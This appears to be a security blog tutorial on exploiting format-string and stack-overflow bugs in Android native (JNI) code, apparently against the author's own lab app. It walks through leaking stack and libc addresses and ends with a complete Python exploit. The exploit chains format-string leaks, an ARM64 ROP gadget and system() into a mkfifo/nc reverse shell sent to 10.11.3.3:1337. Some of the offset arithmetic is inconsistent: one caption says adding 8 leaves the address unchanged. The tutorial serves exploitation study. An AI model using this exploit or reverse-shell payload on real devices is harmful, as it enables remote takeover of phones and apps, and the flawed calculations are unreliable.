---
description: 06/11/2024 -- Time to wreck some havoc
cover: https://i.imgur.com/hxRHztm.gif
coverY: 44.74285714285714
---

# 🔎 Pinpointing Low-Level Bugs in Android: Stack Smashing

## Introduction

By leveraging Android's Native Development Kit (NDK), it will directly grant us access to the Java Native Implementation (JNI). Essentially, this allows us to be able to utilize native, C code within Java at the same time. JNI essentially is a mechanism that makes this possible. The NDK is built on top of the JNI.

<mark style="color:yellow;">**This section will focus on stack-based exploitation.**</mark>

{% hint style="info" %}
**Note: For greater introspection, please check out my** [**Binary Exploitation**](../../binary-exploitation/) **section as well as others in the community. A lot of what is talked about there will be referred to in here!**
{% endhint %}

{% hint style="info" %}
**Reminder: JNI is usually implemented when file I/O, sound, graphical rendering, encryption, etc. is taking place. This is because C/C++ simply does it better and quicker.**
{% endhint %}

## Need More Context Before Diving in?

Be sure to check out my previous blogs on binary exploitation on x86/64 architectures. Especially, when it comes to bypassing security mitigations such as NX, ASLR, and canaries!

{% content-ref url="../../binary-exploitation/bypassing-aslr-and-nx-dep-diving-deeper.md" %}
[bypassing-aslr-and-nx-dep-diving-deeper.md](../../binary-exploitation/bypassing-aslr-and-nx-dep-diving-deeper.md)
{% endcontent-ref %}

{% content-ref url="../../binary-exploitation/memory-protections/no-execute-nx.md" %}
[no-execute-nx.md](../../binary-exploitation/memory-protections/no-execute-nx.md)
{% endcontent-ref %}

{% content-ref url="../../binary-exploitation/binary-exploitation-methodology.md" %}
[binary-exploitation-methodology.md](../../binary-exploitation/binary-exploitation-methodology.md)
{% endcontent-ref %}

## Oracle JNI Docs

{% embed url="https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/design.html" %}
Oracle JNI Docs
{% endembed %}

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption><p>JNI Illustration</p></figcaption></figure>

As you can see, the JNI is simply just an array of pointers (pointer-to-pointer array). Each JNI function will include a `Java_OnLoad` or begin with `Java_com`. There are two ways of calling JNI functions, static and dynamic.&#x20;

### Static Calls

Uses the `RegisterNatives` API call.

**Java side:**

The method within the Java class is going to be identified as follows during declaration:

```java
public class MyClass {
    public static void myStaticMethod() {
        // Implementation here
    }
}
```

**C side:**&#x20;

```cpp
JNIEnv *env
jclass cls = (*env)->FindClass(env, "MyClass");
jmethodID mid = (*env)->GetStaticMethodIDenv, cls, "myStaticMethod", "()V");
(*env)->CallStaticVoidMethod(env, cls, mid);
```

### Dynamic Calls

Using JNI native method name resololving.

Search for "`Java_`" within Ghidra's symbol tree.

## Leveraging Memory Leak Bugs

While performing static analysis on the target, it is always important to recognize and document any data ingestion points. This will allow us to know what to look for when debugging various functions.&#x20;

### What Kind of Data can be Leaked?

* Data
* Addresses
* PII (sensitive data)
* Passwords
* Arming ourselves with data to bypass ASLR

### Bugs That Exist

* [Format String Bugs](../../binary-exploitation/format-string-vulnerabilities.md) will be the most common
* [Use-After-Free](../../binary-exploitation/heap-exploitation/use-after-free.md)'s
* Heap Overflows
* Type Confusion

## Leaking Data in Memory via Memory Leak

{% embed url="https://media0.giphy.com/media/Q2W4hziDOyzu0/giphy.gif?cid=6c09b952020782cauu5o9zy9rb47rueprg6jdmirl7h7m33z&ep=v1_gifs_search&rid=giphy.gif&ct=g" %}

<mark style="color:yellow;">**The main one will be format string bugs.**</mark>&#x20;

This is simply when an attacker possesses the ability to control the format-string specifier in format-string functions. Ultimately, this leads to the ability to leak and write data, which leads to code execution. These vulnerabilities will allow us to not only leak data, but write data in memory.

### What to look for

**Vulnerable:**

```c
void vulnerable_function(char *user_input) {
    printf(user_input);  // Vulnerable to format string attack
}
```

**Not Vulnerable:**

```c
void secure_function(char *user_input) {
    printf("%s", user_input);
}
```

When data is requested, we the attackers, can pass our own format string specifiers. For example, `%lx`, `%s`, `%n` (write data).

{% hint style="info" %}
**Note: %x will just be 32-bit, whereas %lx will be a 64-bit value!**&#x20;
{% endhint %}

### Don't Forget About Positional Arguments When Leaking Data!

We can utilize positional arguments to leak specific data off of the stack, straight to our console!

```
%110$lx # -> Prints the 110th element from the stack
```

<mark style="color:yellow;">The ultimate goal is to find a location on the stack that is not changing, or reoccurring a few times after a couple executions. So, it's okay to run the program more than once to verify, take your time.</mark>

### **For example:**

After leaking, we can use `$lx` to leak and leverage positional arguments if need be as well.&#x20;

Once leaking, we can obtain the stack base, since our leak will "start" from the stack base, or stack pointer.

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption><p>This represents our stack_base. Obtaining stack base (<code>sp</code>)</p></figcaption></figure>

We can then look for reoccurring addresses within the stack dump (`x/200gx $sp`) or we can `vmmap` certain addresses.

Below, you can see that we have three addresses obtained from our stack dump information.

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption><p>Utilizing vmmap to obtain memory mapping/segment information</p></figcaption></figure>

## Leaking an Address

The goal here is to find the offset to the image base (find an offset from the leaked address to the base address). After that, we will possess enough information to calculate the base address.

1. Leak an address
2. Find a leaked libc library address in memory; confirming with `vmmap`

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption><p>This represents our Leaked_address. Since we are adding 8 anyways for byte-alignment, we want to be able to grab the blue address, not the 64-bit address</p></figcaption></figure>

### Using the Following Equation

<mark style="color:yellow;">**Offset = Leaked\_address (%lx -- libc addr, verified w/ vmmap) - stack\_base (x/200gx $sp)**</mark>

**Example:**

<mark style="color:green;">**Offset**</mark>**&#x20;= 0x789dd19c58 (add +8) -** 0x789dd19670

**Offset =&#x20;**<mark style="color:green;">**5E8 (hex)**</mark>&#x20;

### How To: Leak

1. Through RE efforts, locate vulnerable bugs and format-string functions
2. While performing dynamic analysis and debugging, be sure to `disass <function_name>`, obtain the address of the format-string function and place a breakpoint on it
3. Take note of the stack address by examining it: `x/200gx $sp`
4. Take some time to analyze the stack dump and look for addresses that are occurring next to each other, contiguously in memory. This value will be known as our "constant" leak address. As it will remain unchanged and constant throughout numerous executions
5. `vmmap` leaked addresses in order to find out if they belong to our dynamic library, (e.g.) libc

## Leaking a libc Address!

{% hint style="info" %}
**Note: This is literally the same process as before, except with an additional step (step 5)!**
{% endhint %}

1. Through RE efforts, locate vulnerable bugs and format-string functions
2. While performing dynamic analysis and debugging, be sure to `disass <function_name>`, obtain the address of the format-string function and place a breakpoint on it
3. Take note of the stack address by examining it: `x/200gx $sp`
4. Take some time to analyze the stack dump and look for addresses that are occurring next to each other, contiguously in memory. This value will be known as our "constant" leak address. As it will remain unchanged and constant throughout numerous executions
5. `vmmap` leaked addresses in order to find out if they belong to our dynamic library, (e.g.) libc

### Obtaining Current libc Address

#### <mark style="color:yellow;">Okay, but how do we easily find libc addresses without having to vmmap every single dumped stack address?</mark>

We need to get the current libc address via <mark style="color:yellow;">`vmmap`</mark>.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">`0x0000007b5ec79000`</mark>

There's an easy work-around for this. We can simply search for the first four-bytes of the address obtained from the libc base.

In this case, we are going to be searching for 7b5e

**Obtain leaked\_address from earlier, remember, `blue address + 8`:**

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Leaked address, + 8, giving us<strong><code>-></code></strong><code>0x789dd19c58 + 8 =</code><strong><code>0x789dd19c58</code></strong></p></figcaption></figure>

**We can do this by:**

**Obtaining stack base address:**

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong><code>0x789dd19670</code></strong></p></figcaption></figure>

### Equation to Follow

<mark style="color:green;">**libc\_address = leaked\_address (**</mark><mark style="color:green;">**`0x789dd19c58`**</mark><mark style="color:green;">**) - stack\_base (**</mark><mark style="color:green;">**`0x789dd19670`**</mark><mark style="color:green;">**)**</mark>

```
libc address = leaked_address - stack_base / 8 (byte-size) + 6 (padding) = libc's position in memory
```

Our position will then be in hex, we need to obtain the decimal conversion of that hex number.&#x20;

**Example**

```
0x789dd19c58−0x789dd19670 = 0x5E8
```

We then take this and do the following:

```
0x5E8 / 8 + 6 = hex_position -> convert to decimal = libc_distance
```

```
0x5E8 / 8 + 6 = C3 -> Converted to Decimal = 195
```

### We can then start crafting out an exploit!

Using the data collected above, we can start crafting an exploit!

{% hint style="info" %}
**🚨 Be sure to be conscious of the comments that are throughout the code. Some important enumeration information that is necessary to exploit the target has been commented out for brevity, simplicity, or for the sake of a separate cyber effect (type of vulnerability) to be brought on upon the target.**
{% endhint %}

**`exploit.py`:**

```python
#!/usr/bin/env python2.7

# exploit.py -- featuring a multi-type exploit against a single target
# Featuring ret2win, ret2libc, memory leak address enumeration, and ROP chain

import socket
import time
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<victim_ip_here>",<victim_port_here>))
data = s.recv(200)
# Leak Stack Address
print "Step 1: Leak Stack Address!\n";
s.send("%26$lx")            # Seemingly reoccurring address in debugger
leakedStack = s.recv(200)   # Receive 200-bytes
print "[+] Leaked process stack: 0x" + leakedStack   # Print received values from above

print"---------------------------------------------"

# Leak Libc address
print "\nStep 2: Leak libc address from the stack!\n"
print "[!] Leaking libc address and sending format string of %195$ls to our vulnerable program"
s.send("%195$lx")           # Sending format string to program  
leakedLibc = s.recv(200)    # Receive leaked libc address
print "[+] Leaked libc address: 0x" + leakedLibc

leakedStack = int("0x"+leakedStack, 16)
leakedStackTop = leakedStack - 0x1B8
print "[+] Calculated stack top: " + hex(leakedStackTop)

print"---------------------------------------------"

# Calculate Libc Base Address
print "\nStep 3: Calculate libc base address\n"
print "[!] Calculating libc base..."
leakedOffset = 0x52FBC
libcBase = int("0x"+leakedLibc, 16) - leakedOffset
print "[+] Calculated libc base: "  , hex(libcBase)
print"---------------------------------------------"

prefix = "0xfa"

overflow = "A"*208
# Inside GDB -> "p printLog" -> 0x7366a962f0 
# [!] Note: this will change each program execution due to ASLR, be sure to obtain and change each execution
# pc = "\xf0\x62\xa9\x66\x73\x00\x00\x00" 

print"\nStep 4: Obtain gadget and system address\n"
print"[!] Obtaining gadget address and system address from libc..."

# Address for the "pop" gadget (obtained via ropper): 0x000000000007f96c: ldp x0, x8, [sp, #0x20]; ldr x27, [sp, #0x10]; str wzr, [x8]; blr x27; 
pop_gadget = libcBase + 0x7f96c

# Junk data
junk = "A"*24
# ret2libc ROP chain setup
# system = "BBBBBBBB" # p system system - libcBase
# system_args = "CCCCsCCCC"
# system_args_addr = "DDDDDDDD"

# exploit = prefix + overflow + struct.pack("<Q", pop_gadget) + junk + system + "A" * 8 + system_args_addr + system_args

# libcBase + system_offset (obtained via "p system" in gdb)
system = libcBase + 0x62F3C #System = libcBase (vmmap libc.so address - system above)
print "[+] Gadget address " , hex(pop_gadget)
print "[+] System address " , hex(system)
print"---------------------------------------------"

# Use our leakedStackTop to find the beginning of our command on the stack
system_args_address = leakedStackTop + 0xB0
system_args = "C" * 32
system_args= "rm /data/data/com.example.mynativetest/f;/system/bin/toybox mkfifo /data/data/com.example.mynativetest/f;cat /data/data/com.example.mynativetest/f|/system/bin/sh -i 2>&1|/system/bin/toybox nc 10.11.3.3 1337 >/data/data/com.example.mynativetest/f"

# Build the exploit string
# ret2win exploit: exploit = prefix + overflow + pc
# ret2libc exploit: A*208 + gadget + A * 24 + system + 8 * junk + address_cmd + cmd_string
# Ropchain exploit: exploit = prefix + overflow + struct.pack("<Q",pop_gadget) + "b" * 24 + struct.pack("<Q",system) + "b" * 8 + struct.pack("<Q",system_args_address) + struct.pack("<Q", leakedStackTop) + system_args
# Reverse shell exploit
exploit = prefix + overflow + struct.pack("<Q", pop_gadget) + junk + struct.pack("<Q", system) + "A" * 8 + struct.pack("<Q", system_args_address) + struct.pack("<Q", system_args_address) + system_args

s.send(exploit)
```
